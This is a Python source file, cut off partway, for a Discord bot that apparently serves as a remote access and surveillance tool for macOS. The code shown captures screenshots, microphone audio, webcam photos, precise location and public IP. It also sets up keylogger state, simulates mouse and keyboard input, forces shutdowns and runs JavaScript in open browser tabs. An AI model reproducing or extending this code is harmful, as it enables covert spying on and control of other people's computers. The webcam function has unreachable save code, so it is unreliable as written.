# importing packages
import os
import discord
from discord.ext import commands
try:
    from dotenv import load_dotenv
except ImportError:
    try:
        from python_dotenv import load_dotenv
    except ImportError:
        raise ImportError("Neither 'dotenv' nor 'python_dotenv' could be imported. Please ensure 'python-dotenv' is installed in your environment.")
import sounddevice as sd
import scipy.io.wavfile as wav
import numpy as np
from datetime import datetime
import asyncio
import psutil
import cv2
import platform
import socket
import time
import webbrowser
import subprocess
from pynput import keyboard
import threading
import json
import logging
from Quartz import (
    CGMainDisplayID,
    CGDisplayCreateImage,
    kCGNullWindowID,
    kCGWindowListOptionOnScreenOnly,
    CGWindowListCopyWindowInfo,
    kCGNullWindowID
)
import shutil
import traceback
import fnmatch
import re
from pathlib import Path
import pyautogui

# Set up
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('discord')

# Configure PyAutoGUI
pyautogui.FAILSAFE = True  # Enable failsafe (move mouse to corner to stop)
pyautogui.PAUSE = 0.1  # Add small pause between actions for safety

# load .env token
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')
if not TOKEN:
    logger.error('DISCORD_TOKEN not found in environment variables. Please set it in your .env file.')
    print('DISCORD_TOKEN not found in environment variables. Please set it in your .env file.')
    exit(1)

# Configuration for new commands
ALLOWED_USER_IDS = os.getenv('ALLOWED_USER_IDS', '')  # Comma-separated list of user IDs authorized for /kill
FIND_DEFAULT_PATH = os.getenv('FIND_DEFAULT_PATH', str(Path.home()))  # Default search path for /find command
BLOCK_AUTHORIZED_USERS = os.getenv('BLOCK_AUTHORIZED_USERS', '')  # Comma-separated list of user IDs authorized for website blocking

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

# variable for keylogger
keylogger_active = False
keylogger_data = []
keylogger_listener = None
keylogger_channel = None
last_send_time = 0

# variables for website monitoring
website_monitor_active = False
website_monitor_thread = None
website_monitor_channel = None
last_active_url = ""

# variables for website blocking
command_history = []  # Track last 20 executed commands

# def func
def take_screenshot():
    """Take a screenshot and save it to a file. Returns the file path."""
    from PIL import ImageGrab
    screenshot = ImageGrab.grab()
    screenshot_path = f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png'
    screenshot.save(screenshot_path)
    return screenshot_path

def record_audio(duration=10, sample_rate=44100):
    """Record audio from the microphone and save to a file. Returns the file path."""
    recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=2)
    sd.wait()
    audio_path = f'audio_{datetime.now().strftime("%Y%m%d_%H%M%S")}.wav'
    wav.write(audio_path, sample_rate, recording)
    return audio_path

def get_screen_size():
    """Get current screen dimensions."""
    try:
        return pyautogui.size()
    except Exception as e:
        logger.error(f"Error getting screen size: {str(e)}")
        return None

def click_at_coordinates(x: int, y: int, button: str = 'left', clicks: int = 1, hold_duration: float = 0.0):
    """
    Click at specific screen coordinates with validation and long click support.
    
    Args:
        x (int): X coordinate
        y (int): Y coordinate  
        button (str): Mouse button ('left', 'right', 'middle')
        clicks (int): Number of clicks (1-10)
        hold_duration (float): Hold duration in seconds (0.0-10.0, 0.0 for normal click)
    
    Returns:
        tuple: (success: bool, message: str)
    """
    try:
        # Get screen size for validation
        screen_size = get_screen_size()
        if not screen_size:
            return False, "Could not determine screen size"
        
        screen_width, screen_height = screen_size
        
        # Validate coordinates
        if x < 0 or x >= screen_width or y < 0 or y >= screen_height:
            return False, f"Coordinates ({x}, {y}) out of screen bounds (0, 0) to ({screen_width-1}, {screen_height-1})"
        
        # Validate button
        valid_buttons = ['left', 'right', 'middle']
        if button not in valid_buttons:
            return False, f"Invalid button '{button}'. Must be one of: {', '.join(valid_buttons)}"
        
        # Validate clicks
        if clicks < 1 or clicks > 10:
            return False, "Click count must be between 1 and 10"
        
        # Validate hold duration
        if hold_duration < 0.0 or hold_duration > 10.0:
            return False, "Hold duration must be between 0.0 and 10.0 seconds"
        
        # Perform the click
        if hold_duration > 0.0:
            # Long click: mouseDown -> sleep -> mouseUp
            if clicks > 1:
                return False, "Long clicks (hold_duration > 0) cannot be combined with multiple clicks"
            
            pyautogui.mouseDown(x, y, button=button)
            time.sleep(hold_duration)
            pyautogui.mouseUp(x, y, button=button)
            
            return True, f"Long {button} click at ({x}, {y}) held for {hold_duration}s"
        else:
            # Normal click
            pyautogui.click(x, y, clicks=clicks, button=button)
            
            click_type = f"{clicks}x " if clicks > 1 else ""
            return True, f"{click_type}{button.title()} click at ({x}, {y})"
        
    except Exception as e:
        logger.error(f"Error in click_at_coordinates: {str(e)}")
        return False, f"Click failed: {str(e)}"

def type_text(text: str, interval: float = 0.01):
    """
    Type text with support for special keys.
    
    Args:
        text (str): Text to type (supports \\n for Enter, \\t for Tab)
        interval (float): Delay between keystrokes
    
    Returns:
        tuple: (success: bool, message: str)
    """
    try:
        # Validate text length
        if len(text) > 1000:
            return False, "Text too long (max 1000 characters)"
        
        if not text:
            return False, "No text provided"
        
        # Process text with special key support
        special_keys_processed = 0
        current_text = ""
        i = 0
        
        while i < len(text):
            if text[i:i+2] == '\\n':
                # Type current text if any
                if current_text:
                    pyautogui.write(current_text, interval=interval)
                    current_text = ""
                # Press Enter
                pyautogui.press('enter')
                special_keys_processed += 1
                i += 2
            elif text[i:i+2] == '\\t':
                # Type current text if any
                if current_text:
                    pyautogui.write(current_text, interval=interval)
                    current_text = ""
                # Press Tab
                pyautogui.press('tab')
                special_keys_processed += 1
                i += 2
            else:
                current_text += text[i]
                i += 1
        
        # Type remaining text
        if current_text:
            pyautogui.write(current_text, interval=interval)
        
        # Build result message
        char_count = len(text) - (special_keys_processed * 2)  # Subtract escape sequences
        message = f"Typed {char_count} characters"
        if special_keys_processed > 0:
            message += f" with {special_keys_processed} special keys"
        
        return True, message
        
    except Exception as e:
        logger.error(f"Error in type_text: {str(e)}")
        return False, f"Type failed: {str(e)}"

def scroll_at_coordinates(x: int = None, y: int = None, clicks: int = 1, direction: str = 'up'):
    """
    Scroll mouse wheel at specific coordinates or current position.
    
    Args:
        x (int, optional): X coordinate (None for current position)
        y (int, optional): Y coordinate (None for current position)
        clicks (int): Number of scroll clicks (1-20)
        direction (str): Scroll direction ('up' or 'down')
    
    Returns:
        tuple: (success: bool, message: str)
    """
    try:
        # Validate clicks
        if clicks < 1 or clicks > 20:
            return False, "Scroll clicks must be between 1 and 20"
        
        # Validate direction and convert to scroll amount
        if direction.lower() == 'up':
            scroll_amount = clicks
        elif direction.lower() == 'down':
            scroll_amount = -clicks
        else:
            return False, "Direction must be 'up' or 'down'"
        
        # If coordinates provided, validate them
        if x is not None or y is not None:
            screen_size = get_screen_size()
            if not screen_size:
                return False, "Could not determine screen size"
            
            screen_width, screen_height = screen_size
            
            # Use current position if only one coordinate provided
            if x is None or y is None:
                current_x, current_y = pyautogui.position()
                x = x if x is not None else current_x
                y = y if y is not None else current_y
            
            # Validate coordinates
            if x < 0 or x >= screen_width or y < 0 or y >= screen_height:
                return False, f"Coordinates ({x}, {y}) out of screen bounds (0, 0) to ({screen_width-1}, {screen_height-1})"
            
            # Scroll at specific coordinates
            pyautogui.scroll(scroll_amount, x=x, y=y)
            position_msg = f" at ({x}, {y})"
        else:
            # Scroll at current cursor position
            pyautogui.scroll(scroll_amount)
            position_msg = " at current cursor position"
        
        return True, f"Scrolled {direction} {clicks} clicks{position_msg}"
        
    except Exception as e:
        logger.error(f"Error in scroll_at_coordinates: {str(e)}")
        return False, f"Scroll failed: {str(e)}"

def execute_hotkey(keys_string: str):
    """
    Execute keyboard shortcut/hotkey combination.
    
    Args:
        keys_string (str): Keys separated by + (e.g., "command+c", "ctrl+shift+t")
    
    Returns:
        tuple: (success: bool, message: str)
    """
    try:
        if not keys_string:
            return False, "No keys provided"
        
        # Parse keys by splitting on +
        keys = [key.strip().lower() for key in keys_string.split('+')]
        
        # Validate number of keys
        if len(keys) > 5:
            return False, "Maximum 5 keys per shortcut"
        
        if len(keys) < 1:
            return False, "At least 1 key required"
        
        # Common key aliases
        key_aliases = {
            'cmd': 'command',
            'control': 'ctrl',
            'option': 'alt',
            'meta': 'command'
        }
        
        # Resolve aliases and validate keys
        resolved_keys = []
        for key in keys:
            # Apply alias if exists
            key = key_aliases.get(key, key)
            
            # Validate key exists in PyAutoGUI
            if key not in pyautogui.KEYBOARD_KEYS:
                return False, f"Invalid key: '{key}'. Use keys like: command, ctrl, alt, shift, fn, f1-f12, a-z, 0-9, tab, enter, space, arrow keys"
            
            resolved_keys.append(key)
        
        # Execute hotkey
        pyautogui.hotkey(*resolved_keys)
        
        keys_display = '+'.join(resolved_keys)
        return True, f"Executed hotkey: {keys_display}"
        
    except Exception as e:
        logger.error(f"Error in execute_hotkey: {str(e)}")
        return False, f"Hotkey execution failed: {str(e)}"

def get_system_info():
    """Get comprehensive system information as a string."""
    import requests
    from datetime import datetime
    
    system_info = "=== SYSTEM INFORMATION ===\n\n"
    
    # Date and Time
    current_time = datetime.now()
    system_info += f"📅 **Current Time**: {current_time.strftime('%Y-%m-%d %H:%M:%S')}\n"
    system_info += f"🌍 **Timezone**: {current_time.astimezone().tzname()}\n\n"
    
    # macOS Version and Model
    try:
        mac_version = platform.mac_ver()[0]
        system_info += f"🖥️ **macOS Version**: {mac_version}\n"
    except Exception:
        system_info += f"🖥️ **macOS Version**: Unknown\n"
    
    try:
        # Get Mac model using system_profiler
        model_result = subprocess.run(['system_profiler', 'SPHardwareDataType'], 
                                    capture_output=True, text=True, check=False)
        if model_result.returncode == 0:
            for line in model_result.stdout.split('\n'):
                if 'Model Name:' in line:
                    model = line.split('Model Name:')[1].strip()
                    system_info += f"💻 **Mac Model**: {model}\n"
                    break
                elif 'Model Identifier:' in line:
                    identifier = line.split('Model Identifier:')[1].strip()
                    system_info += f"🔧 **Model ID**: {identifier}\n"
        else:
            system_info += f"💻 **Mac Model**: Unknown\n"
    except Exception:
        system_info += f"💻 **Mac Model**: Unknown\n"
    
    # CPU Information
    try:
        cpu_count = psutil.cpu_count(logical=False)
        cpu_count_logical = psutil.cpu_count(logical=True)
        cpu_freq = psutil.cpu_freq()
        cpu_percent = psutil.cpu_percent(interval=1)
        
        system_info += f"🔥 **CPU Cores**: {cpu_count} physical, {cpu_count_logical} logical\n"
        if cpu_freq:
            system_info += f"⚡ **CPU Frequency**: {cpu_freq.current:.1f} MHz (Max: {cpu_freq.max:.1f} MHz)\n"
        system_info += f"📊 **CPU Usage**: {cpu_percent}%\n"
        system_info += f"🖲️ **Processor**: {platform.processor()}\n\n"
    except Exception as e:
        system_info += f"🔥 **CPU Info**: Error getting CPU info\n\n"
    
    # Memory Information
    try:
        memory = psutil.virtual_memory()
        memory_gb_total = memory.total / (1024**3)
        memory_gb_used = memory.used / (1024**3)
        memory_gb_available = memory.available / (1024**3)
        
        system_info += f"🧠 **Total RAM**: {memory_gb_total:.2f} GB\n"
        system_info += f"📈 **Used RAM**: {memory_gb_used:.2f} GB ({memory.percent}%)\n"
        system_info += f"📉 **Available RAM**: {memory_gb_available:.2f} GB\n\n"
    except Exception:
        system_info += f"🧠 **RAM Info**: Error getting memory info\n\n"
    
    # Battery Information
    try:
        battery = psutil.sensors_battery()
        if battery:
            battery_percent = battery.percent
            plugged = "🔌 Plugged In" if battery.power_plugged else "🔋 On Battery"
            if battery.secsleft != psutil.POWER_TIME_UNLIMITED and battery.secsleft > 0:
                hours, remainder = divmod(battery.secsleft, 3600)
                minutes = remainder // 60
                time_left = f" ({hours}h {minutes}m remaining)"
            else:
                time_left = ""
            system_info += f"🔋 **Battery**: {battery_percent}% - {plugged}{time_left}\n\n"
        else:
            system_info += f"🔋 **Battery**: No battery detected (Desktop Mac)\n\n"
    except Exception:
        system_info += f"🔋 **Battery**: Error getting battery info\n\n"
    
    # Network and Location
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        system_info += f"🌐 **Hostname**: {hostname}\n"
        system_info += f"🔗 **Local IP**: {local_ip}\n"
        
        # Get public IP and location
        try:
            response = requests.get('https://ipapi.co/json/', timeout=5)
            if response.status_code == 200:
                data = response.json()
                public_ip = data.get('ip', 'Unknown')
                city = data.get('city', 'Unknown')
                region = data.get('region', 'Unknown')
                country = data.get('country_name', 'Unknown')
                isp = data.get('org', 'Unknown')
                
                system_info += f"🌍 **Public IP**: {public_ip}\n"
                system_info += f"📍 **Location**: {city}, {region}, {country}\n"
                system_info += f"🏢 **ISP**: {isp}\n"
            else:
                system_info += f"🌍 **Public IP**: Unable to fetch\n"
                system_info += f"📍 **Location**: Unable to fetch\n"
        except Exception:
            system_info += f"🌍 **Public IP**: Unable to fetch (No internet)\n"
            system_info += f"📍 **Location**: Unable to fetch\n"
    except Exception:
        system_info += f"🌐 **Network Info**: Error getting network info\n"
    
    # Display Information
    try:
        from PIL import ImageGrab
        import Quartz
        
        # Get screen size using PIL
        screen = ImageGrab.grab()
        width, height = screen.size
        system_info += f"\n📺 **Screen Resolution**: {width} x {height} pixels\n"
        
        # Get additional display info using Quartz
        try:
            main_display = Quartz.CGMainDisplayID()
            display_bounds = Quartz.CGDisplayBounds(main_display)
            display_width = int(display_bounds.size.width)
            display_height = int(display_bounds.size.height)
            
            # Get display scaling factor
            backing_scale = Quartz.CGDisplayCreateImage(main_display)
            if backing_scale:
                system_info += f"🔍 **Display Scale**: Retina/HiDPI detected\n"
            
            # Calculate approximate physical size (this is an estimate)
            dpi = 72  # Default macOS DPI
            width_inches = display_width / dpi
            height_inches = display_height / dpi
            diagonal_inches = (width_inches**2 + height_inches**2)**0.5
            
            system_info += f"📐 **Estimated Size**: {diagonal_inches:.1f}\" diagonal\n"
            
        except Exception:
            system_info += f"📺 **Display Details**: Basic resolution only\n"
            
    except Exception:
        system_info += f"\n📺 **Screen Info**: Unable to detect screen size\n"

    # Additional System Info
    system_info += f"\n=== ADDITIONAL INFO ===\n"
    system_info += f"🐍 **Python Version**: {platform.python_version()}\n"
    system_info += f"📦 **Platform**: {platform.platform()}\n"
    system_info += f"🖥️ **Architecture**: {platform.architecture()[0]}\n"
    
    return system_info

def get_precise_location():
    """Get precise location using macOS Core Location Services via Shortcuts.
    
    Returns:
        dict: Location data with coordinates, address, and timestamp
    """
    from datetime import datetime
    import json
    
    location_data = {
        'success': False,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'),
        'timezone': datetime.now().astimezone().tzname(),
        'latitude': None,
        'longitude': None,
        'address': None,
        'error': None
    }
    
    try:
        # First, try to get location using the required shortcut
        result = subprocess.run([
            'shortcuts', 'run', 'Get Location Data'
        ], capture_output=True, text=True, timeout=30)
        
        if result.returncode == 0 and result.stdout.strip():
            output = result.stdout.strip()
            
            try:
                # Try to parse as JSON if the shortcut returns structured data
                location_info = json.loads(output)
                location_data.update({
                    'success': True,
                    'latitude': location_info.get('latitude'),
                    'longitude': location_info.get('longitude'),
                    'address': location_info.get('address', 'Address not available')
                })
                return location_data
            except json.JSONDecodeError:
                # If not JSON, try to parse plain text in the form:
                # "address, latitude, longitude" OR "latitude, longitude"
                if ',' in output:
                    parts = [p.strip() for p in output.split(',')]
                    try:
                        if len(parts) >= 3:
                            # Use the last two fields as coordinates, everything before as address
                            latitude = float(parts[-2])
                            longitude = float(parts[-1])
                            address_str = ', '.join(parts[:-2]).strip()
                            location_data.update({
                                'success': True,
                                'latitude': latitude,
                                'longitude': longitude,
                                'address': address_str or 'Address not available'
                            })
                            return location_data
                        elif len(parts) >= 2:
                            latitude = float(parts[0])
                            longitude = float(parts[1])
                            # Fallback: derive address via reverse geocoding
                            address = get_address_from_coordinates(latitude, longitude)
                            location_data.update({
                                'success': True,
                                'latitude': latitude,
                                'longitude': longitude,
                                'address': address
                            })
                            return location_data
                        else:
                            location_data['error'] = "Unexpected shortcut output format"
                    except ValueError:
                        location_data['error'] = "Invalid coordinate format from shortcut"
                else:
                    location_data['error'] = "Unexpected shortcut output format"
        else:
            if "doesn't exist" in result.stderr.lower() or "not found" in result.stderr.lower():
                location_data['error'] = "Required shortcut 'Get Location Data' not found"
            elif "permission" in result.stderr.lower() or "denied" in result.stderr.lower():
                location_data['error'] = "Location permission denied - check Privacy settings"
            else:
                location_data['error'] = f"Shortcut execution failed: {result.stderr.strip() if result.stderr else 'No output received'}"
            
    except subprocess.TimeoutExpired:
        location_data['error'] = "Location request timed out - GPS may be unavailable"
    except FileNotFoundError:
        location_data['error'] = "Shortcuts app not found - macOS 12+ required"
    except Exception as e:
        location_data['error'] = f"Unexpected error: {str(e)}"
    
    return location_data

def get_address_from_coordinates(latitude, longitude):
    """Get human-readable address from coordinates using reverse geocoding."""
    try:
        import requests
        # Use a reliable reverse geocoding service
        response = requests.get(
            f"https://api.bigdatacloud.net/data/reverse-geocode-client?latitude={latitude}&longitude={longitude}&localityLanguage=en",
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            
            # Build address from components
            address_parts = []
            
            if data.get('locality'):  # City
                address_parts.append(data['locality'])
            if data.get('principalSubdivision'):  # State/Province
                address_parts.append(data['principalSubdivision'])
            if data.get('countryName'):  # Country
                address_parts.append(data['countryName'])
            
            if address_parts:
                return ', '.join(address_parts)
            else:
                return f"Coordinates: {latitude:.6f}, {longitude:.6f}"
        else:
            return f"Coordinates: {latitude:.6f}, {longitude:.6f}"
            
    except Exception:
        return f"Coordinates: {latitude:.6f}, {longitude:.6f}"

def get_ip_address():
    hostname = socket.gethostname()
    return socket.gethostbyname(hostname)

def get_uptime():
    uptime = time.time() - psutil.boot_time()
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    return f"{hours}h {minutes}m {seconds}s"

def get_top_processes(sort_by='ram', limit=15):
    """Get top processes sorted by CPU or RAM usage, combining processes with same name.
    
    Args:
        sort_by: 'cpu' or 'ram' to sort by CPU or RAM usage
        limit: Number of process groups to return
    
    Returns:
        List of process dictionaries with combined stats
    """
    # List of common processes to exclude
    system_processes = {
        'WindowServer', 'kernel_task', 'launchd', 'logd', 'UserEventAgent', 'fseventsd',
        'mediaremoted', 'systemstats', 'configd', 'powerd', 'IOMFB_bics_daemo', 'syslogd',
        'notifyd', 'distnoted', 'securityd', 'hidd', 'coreaudiod', 'diskarbitrationd',
        'bluetoothd', 'airportd', 'cfprefsd', 'mds', 'mdworker', 'mds_stores', 'opendirectoryd',
        'iconservicesagent', 'iconservicesd', 'usbd', 'launchservicesd', 'warmd', 'sandboxd',
        'tccd', 'trustd', 'appleeventsd', 'corebrightnessd', 'locationd', 'sharingd', 'lsd',
        'Dock', 'Finder', 'SystemUIServer', 'loginwindow', 'remoted', 'sharingd', 'spindump',
        'ReportCrash', 'backupd', 'com.apple.WebKit.WebContent', 'com.apple.WebKit.Networking',
        'com.apple.WebKit.GPU', 'com.apple.Safari', 'com.apple.Safari.SafeBrowsing.Service',
        'com.apple.SafariBookmarksSyncAgent', 'com.apple.SafariCloudHistoryPushAgent',
        'com.apple.SafariHistory', 'com.apple.SafariLaunchAgent', 'com.apple.SafariPlugInUpdateNotifier',
        'com.apple.SafariServices', 'com.apple.SafariShared', 'com.apple.SafariWebContent',
        'com.apple.SafariWebContent.Development', 'com.apple.SafariWebContent.Network',
        'com.apple.SafariWebContent.Preheated', 'com.apple.SafariWebContent.Service',
        'com.apple.SafariWebContent.WebProcess', 'com.apple.SafariWebKit',
    }
    
    # Dictionary to combine processes by name
    process_groups = {}
    
    for proc in psutil.process_iter(['pid', 'name', 'memory_info', 'cpu_percent']):
        try:
            info = proc.info
            name = info.get('name', '')
            if name in system_processes:
                continue
                
            pid = info['pid']
            mem = info.get('memory_info')
            rss = mem.rss if mem else 0
            
            # Get CPU percentage (may be 0.0 on first call)
            try:
                cpu_percent = proc.cpu_percent()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                cpu_percent = 0.0
            
            # Combine processes with same name
            if name in process_groups:
                process_groups[name]['pids'].append(pid)
                process_groups[name]['rss'] += rss
                process_groups[name]['cpu_percent'] += cpu_percent
                process_groups[name]['count'] += 1
            else:
                process_groups[name] = {
                    'name': name,
                    'pids': [pid],
                    'rss': rss,
                    'cpu_percent': cpu_percent,
                    'count': 1
                }
                
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    
    # Convert to list and sort
    processes = list(process_groups.values())
    sort_key = 'cpu_percent' if sort_by == 'cpu' else 'rss'
    processes.sort(key=lambda x: x[sort_key], reverse=True)
    
    return processes[:limit]

def take_webcam_photo(warmup_seconds: float = 0.3):
    """Open the webcam, wait briefly to allow exposure/focus to settle, then capture a photo."""
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return None
    # Allow the camera to warm up
    time.sleep(warmup_seconds)
    # Capture frame after warmup
    ret, frame = cap.read()
    cap.release()
    if not ret or frame is None:
        return None
        photo_path = f'webcam_{datetime.now().strftime("%Y%m%d_%H%M%S")}.jpg'
        cv2.imwrite(photo_path, frame)
        return photo_path

import Quartz

NSEvent = Quartz.NSEvent
NSSystemDefined = 14
NX_KEYTYPE_PLAY = 16
NX_KEYTYPE_NEXT = 17
NX_KEYTYPE_PREVIOUS = 18

def HIDPostAuxKey(key):
    def doKey(down):
        ev = NSEvent.otherEventWithType_location_modifierFlags_timestamp_windowNumber_context_subtype_data1_data2_(
            NSSystemDefined,
            (0, 0),
            0xa00 if down else 0xb00,
            0, 0, 0,
            8,
            (key << 16) | ((0xa if down else 0xb) << 8),
            -1
        )
        cev = ev.CGEvent()
        Quartz.CGEventPost(0, cev)
    doKey(True)
    doKey(False)

def control_media(action: str):
    """Control media playback using Quartz media keys.
    
    Returns (success: bool, message: str)
    """
    action = action.lower()

    if action == 'play':
        HIDPostAuxKey(NX_KEYTYPE_PLAY)
        return True, "Play/Pause command sent"
    elif action == 'next':
        HIDPostAuxKey(NX_KEYTYPE_NEXT)
        return True, "Next track command sent"
    elif action == 'prev':
        HIDPostAuxKey(NX_KEYTYPE_PREVIOUS)
        return True, "Previous track command sent"
    else:
        return False, f"Unsupported action: {action}"

def set_volume(level):
    """Set system volume (macOS) to a value between 0 and 100."""
    try:
        level = int(level)
        if not (0 <= level <= 100):
            raise ValueError("Volume must be between 0 and 100.")
        # smt abt osascript dk
        subprocess.run(['osascript', '-e', f'set volume output volume {level}'])
        return True, level
    except Exception as e:
        return False, str(e)

def control_system_power(action: str):
    """Control system power state (shutdown, restart, sleep).
    
    Args:
        action: 'shutdown', 'restart', or 'sleep'
    
    Returns:
        tuple: (success: bool, message: str)
    """
    action = action.lower()
    
    try:
        if action == 'shutdown':
            # Use sudo shutdown command for immediate shutdown
            result = subprocess.run(['sudo', 'shutdown', '-h', 'now'], 
                                  capture_output=True, text=True, check=False)
            if result.returncode == 0:
                return True, "System shutdown initiated"
            else:
                return False, f"Shutdown failed: {result.stderr.strip() if result.stderr else 'Unknown error'}"
                
        elif action == 'restart':
            # Use sudo shutdown command for restart
            result = subprocess.run(['sudo', 'shutdown', '-r', 'now'], 
                                  capture_output=True, text=True, check=False)
            if result.returncode == 0:
                return True, "System restart initiated"
            else:
                return False, f"Restart failed: {result.stderr.strip() if result.stderr else 'Unknown error'}"
                
        elif action == 'sleep':
            # Use pmset to put system to sleep (no sudo required for sleep)
            result = subprocess.run(['pmset', 'sleepnow'], 
                                  capture_output=True, text=True, check=False)
            if result.returncode == 0:
                return True, "System going to sleep"
            else:
                # Fallback: try osascript method
                try:
                    subprocess.run(['osascript', '-e', 'tell application "System Events" to sleep'], 
                                 check=True, timeout=5)
                    return True, "System going to sleep"
                except subprocess.CalledProcessError:
                    return False, f"Sleep failed: {result.stderr.strip() if result.stderr else 'Unknown error'}"
                except subprocess.TimeoutExpired:
                    return True, "System going to sleep (command timed out, likely successful)"
                    
        else:
            return False, f"Unsupported power action: {action}. Use 'shutdown', 'restart', or 'sleep'"
            
    except FileNotFoundError as e:
        return False, f"Required system command not found: {str(e)}"
    except Exception as e:
        return False, f"Error controlling power: {str(e)}"

def is_process_running(candidate_names):
    """Return True if any process name contains any of the candidate name substrings (case-insensitive)."""
    try:
        candidate_lower = [c.lower() for c in candidate_names]
        for proc in psutil.process_iter(['name']):
            name = (proc.info.get('name') or '').lower()
            if any(c in name for c in candidate_lower):
                return True
    except Exception:
        pass
    return False

def format_time_mm_ss(seconds_value: float) -> str:
    """Format seconds as MM:SS for display."""
    try:
        total_seconds = max(0, int(round(float(seconds_value))))
        minutes = total_seconds // 60
        seconds = total_seconds % 60
        return f"{minutes:02d}:{seconds:02d}"
    except Exception:
        return "00:00"

def get_spotify_playing_info():
    """Return a dict of now-playing info for Spotify, or None if unavailable."""
    if not is_process_running(['Spotify']):
        return None
    try:
        script = (
            'tell application "Spotify" to set out to '
            '(name of current track as text) & "\t" & '
            '(artist of current track as text) & "\t" & '
            '(album of current track as text) & "\t" & '
            '(duration of current track as text) & "\t" & '
            '(player position as text) & "\t" & '
            '(try artwork url of current track as text on error "" end try) & "\t" & '
            '(player state as text)\nreturn out'
        )
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
        if result.returncode != 0:
            return None
        raw = result.stdout.strip()
        if not raw:
            return None
        parts = raw.split('\t')
        if len(parts) < 7:
            return None
        title, artist, album, duration_str, position_str, artwork_url, state = parts[:7]
        try:
            duration = float(duration_str)
            if duration > 10000:
                duration = duration / 1000.0
        except Exception:
            duration = 0.0
        try:
            position = float(position_str)
        except Exception:
            position = 0.0
        return {
            'app': 'Spotify',
            'title': title,
            'artist': artist,
            'album': album,
            'duration': duration,
            'position': position,
            'state': state,
            'artwork_url': artwork_url if artwork_url else None,
            'artwork_path': None,
        }
    except Exception:
        return None

def get_music_playing_info():
    """Return a dict of now-playing info for Music/iTunes, or None if unavailable."""
    target = 'Music' if is_process_running(['Music']) else ('iTunes' if is_process_running(['iTunes']) else None)
    if not target:
        return None
    try:
        info_script = (
            f'return (tell application "{target}" to '
            f'(name of current track as text) & "\t" & '
            f'(artist of current track as text) & "\t" & '
            f'(album of current track as text) & "\t" & '
            f'(duration of current track as text) & "\t" & '
            f'(player position as text) & "\t" & '
            f'(player state as text))'
        )
        result = subprocess.run(['osascript', '-e', info_script], capture_output=True, text=True, check=False)
        if result.returncode != 0:
            return None
        raw = result.stdout.strip()
        if not raw:
            return None
        parts = raw.split('\t')
        if len(parts) < 6:
            return None
        title, artist, album, duration_str, position_str, state = parts[:6]
        try:
            duration = float(duration_str)
        except Exception:
            duration = 0.0
        try:
            position = float(position_str)
        except Exception:
            position = 0.0

        artwork_path = '/tmp/music_artwork.jpg'
        art_script = (
            'set outPath to POSIX file "' + artwork_path + '"\n'
            'tell application "' + target + '"\n'
            '    try\n'
            '        if (count of artworks of current track) > 0 then\n'
            '            set fileRef to open for access outPath with write permission\n'
            '            set eof of fileRef to 0\n'
            '            write (data of artwork 1 of current track) to fileRef\n'
            '            close access fileRef\n'
            '            return POSIX path of outPath\n'
            '        else\n'
            '            return ""\n'
            '        end if\n'
            '    on error\n'
            '        try\n'
            '            close access outPath\n'
            '        end try\n'
            '        return ""\n'
            '    end try\n'
            'end tell'
        )
        art_res = subprocess.run(['osascript', '-e', art_script], capture_output=True, text=True, check=False)
        art_out = art_res.stdout.strip() if art_res.returncode == 0 else ''
        if not art_out or not os.path.exists(artwork_path):
            artwork_path = None

        return {
            'app': target,
            'title': title,
            'artist': artist,
            'album': album,
            'duration': duration,
            'position': position,
            'state': state,
            'artwork_url': None,
            'artwork_path': artwork_path,
        }
    except Exception:
        return None

def get_media_playing_info():
    """Return now-playing info for Spotify or Music, preferring Spotify if both available."""
    info = get_spotify_playing_info()
    if info:
        return info
    info = get_music_playing_info()
    if info:
        return info
    # Fallback: try YouTube in common browsers
    info = get_youtube_playing_info()
    if info:
        return info
    return None

def _run_js_in_chromium_app(app_name: str, js: str) -> str:
    """Execute JavaScript in the active tab of the front window of a Chromium-based browser."""
    try:
        script = (f'tell application "{app_name}"\n'
                  f'  if (count of windows) = 0 then return ""\n'
                  f'  set theTab to active tab of front window\n'
                  f'  execute javascript "{js}" in theTab\n'
                  f'end tell')
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
        return result.stdout.strip() if result.returncode == 0 else ''
    except Exception:
        return ''

def _run_js_in_safari(js: str) -> str:
    """Execute JavaScript in the current tab of the front document in Safari."""
    try:
        script = ('tell application "Safari"\n'
                  '  if (count of documents) = 0 then return ""\n'
                  f'  do JavaScript "{js}" in current tab of front document\n'
                  'end tell')
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
        return result.stdout.strip() if result.returncode == 0 else ''
    except Exception:
        return ''

def _run_js_in_chromium_app_any_youtube_tab(app_name: str, js: str) -> str:
    """Execute JavaScript in the first YouTube tab across all windows of a Chromium-based browser."""
    try:
        script = (
            f'tell application "{app_name}"\n'
            '  set theResult to ""\n'
            '  if (count of windows) = 0 then return theResult\n'
            '  repeat with w in windows\n'
            '    repeat with t in tabs of w\n'
            '      set theUrl to (URL of t as text)\n'
            '      if theUrl contains "youtube.com" or theUrl contains "music.youtube.com" then\n'
            f'        set theResult to execute javascript "{js}" in t\n'
            '        return theResult\n'
            '      end if\n'
            '    end repeat\n'
            '  end repeat\n'
            '  return theResult\n'
            'end tell'
        )
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
        return result.stdout.strip() if result.returncode == 0 else ''
    except Exception:
        return ''

def _run_js_in_safari_any_youtube_tab(js: str) -> str:
    """Execute JavaScript in the first YouTube tab across all documents in Safari."""
    try:
        script = (
            'tell application "Safari"\n'
            '  set theResult to ""\n'
            '  if (count of documents) = 0 then return theResult\n'
            '  repeat with d in documents\n'
            '    set theUrl to (URL of d as text)\n'
            '    if theUrl contains "youtube.com" or theUrl contains "music.youtube.com" then\n'
            f'      set theResult to do JavaScript "{js}" in d\n'
